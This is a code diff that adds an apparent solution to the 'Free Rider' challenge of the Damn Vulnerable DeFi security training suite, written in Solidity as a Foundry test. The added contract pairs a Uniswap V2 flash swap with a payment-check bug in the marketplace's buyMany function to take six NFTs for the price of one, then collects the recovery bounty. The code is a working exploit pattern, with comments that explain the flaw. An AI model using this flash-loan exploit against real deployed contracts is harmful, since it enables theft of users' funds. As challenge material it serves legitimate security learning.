@@ -12,6 +12,82 @@ import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketpl
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+interface Weth {
+
+    function transfer(address to, uint256 amount) external returns (bool);
+    function deposit() external payable;
+
+    function withdraw(uint256 amount) external;
+}
+
+interface Marketplace {
+    function buyMany(uint256[] calldata tokenIds) external payable;
+}
+
+contract CollectFreeRiderRewards is IERC721Receiver {
+    
+    IUniswapV2Pair immutable _pair;
+    Marketplace immutable _marketplace;
+
+    Weth immutable _weth;
+    DamnValuableNFT immutable _nft;
+
+    address immutable _recoveryContract;
+    address immutable _player;
+
+    uint256 private constant NFT_PRICE = 15 ether;
+    uint256[] private tokens = [0, 1, 2, 3, 4, 5];
+
+    constructor(address ctor_pair, address mplace, address ctor_weth, address ctor_nft, address recCa) payable {
+        _pair = IUniswapV2Pair(ctor_pair);
+        _marketplace = Marketplace(mplace);
+        _weth = Weth(ctor_weth);
+        _nft = DamnValuableNFT(ctor_nft);
+        _recoveryContract = recCa;
+        _player = msg.sender;
+    }
+
+    function doJob() external payable {
+         // Ask Uniswap for some Weth and 0 of DamnValuableToken. We can't pay, but it will lend to us for a short time.
+        _pair.swap(NFT_PRICE, 0, address(this), "1"); // Based on my research, we must pass non-empty data to get a flashloan and the callback.
+    }
+
+    function uniswapV2Call(address, uint, uint, bytes calldata) external {
+        require(msg.sender == address(_pair)); // Callback by uniswap?
+        require(tx.origin == _player);
+
+        _weth.withdraw(NFT_PRICE); // It lent us Weth/eth
+
+        // buy many has a bug: instead of using (msg.value > length(tokens)*NFT_PRICE) to check if we payed, it only charges for one NFT and gives us many. 
+        _marketplace.buyMany{value: NFT_PRICE}(tokens);
+
+        // Repay flash loan + 0.3 % fee.
+        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
+        _weth.deposit{value: amountToPayBack}();
+        _weth.transfer(address(_pair), amountToPayBack);
+
+        // Send the NFTs and give them info about us, so, we get the reward.
+        bytes memory dataPlayerEncoded = abi.encode(_player);
+        for(uint256 i; i < tokens.length; i++){
+            _nft.safeTransferFrom(address(this), _recoveryContract, i, dataPlayerEncoded);
+        }
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+
+    receive() external payable {}
+}
+
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -123,7 +199,16 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        console.log("We have any money? ", address(player).balance  / 1e15, " (approx - last 3 numbers are a fraction) ETH");
+        CollectFreeRiderRewards contract0 = new CollectFreeRiderRewards{value:0.045 ether}(
+            address(uniswapPair),
+            address(marketplace),
+            address(weth),
+            address(nft),
+            address(recoveryManager)
+        );
+        contract0.doJob();
+        console.log("Let's see if we have been rewarded: ", address(player).balance / 1e15, " (approx - last 3 numbers are a fraction) ETH");
     }
 
     /**
